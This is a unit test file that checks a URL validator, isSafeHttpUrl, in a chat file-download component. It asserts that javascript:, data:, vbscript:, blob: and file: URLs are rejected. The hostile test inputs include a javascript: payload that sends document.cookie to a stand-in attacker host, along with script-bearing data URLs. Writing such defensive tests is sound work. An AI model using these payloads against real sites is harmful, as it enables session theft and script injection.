/**
 * @vitest-environment jsdom
 */
import { describe, expect, it, vi } from 'vitest'

vi.mock('@sim/emcn', () => ({
  Button: () => null,
  Download: () => null,
  Loader: () => null,
}))

vi.mock('@/components/icons/document-icons', () => ({
  DefaultFileIcon: () => null,
  getDocumentIcon: () => () => null,
}))

vi.mock('@/lib/core/config/env', () => ({
  env: {},
  getEnv: vi.fn(),
}))

vi.mock('@/lib/core/config/env-flags', () => ({
  isProd: false,
}))

import { isSafeHttpUrl } from '@/app/(interfaces)/chat/components/message/components/file-download'

describe('isSafeHttpUrl', () => {
  it('allows absolute http(s) URLs', () => {
    expect(isSafeHttpUrl('https://example.com/file.pdf')).toBe(true)
    expect(isSafeHttpUrl('http://example.com/file.pdf')).toBe(true)
  })

  it('allows same-origin relative URLs (resolved against the browser origin)', () => {
    expect(isSafeHttpUrl('/api/files/serve/abc?context=execution')).toBe(true)
  })

  it('rejects javascript: URLs', () => {
    expect(isSafeHttpUrl("javascript:fetch('//attacker.example/c?'+document.cookie)")).toBe(false)
    expect(isSafeHttpUrl('JavaScript:alert(1)')).toBe(false)
  })

  it('rejects other script-capable or non-navigable schemes', () => {
    expect(isSafeHttpUrl('data:text/html,<script>alert(1)</script>')).toBe(false)
    expect(isSafeHttpUrl('vbscript:msgbox(1)')).toBe(false)
    expect(isSafeHttpUrl('blob:https://example.com/uuid')).toBe(false)
    expect(isSafeHttpUrl('file:///etc/passwd')).toBe(false)
  })

  it('treats relative junk as same-origin http (safe) rather than throwing', () => {
    expect(isSafeHttpUrl('')).toBe(true)
    expect(isSafeHttpUrl('not a url')).toBe(true)
  })

  it('rejects unparseable absolute input without throwing', () => {
    expect(isSafeHttpUrl('http://')).toBe(false)
  })
})
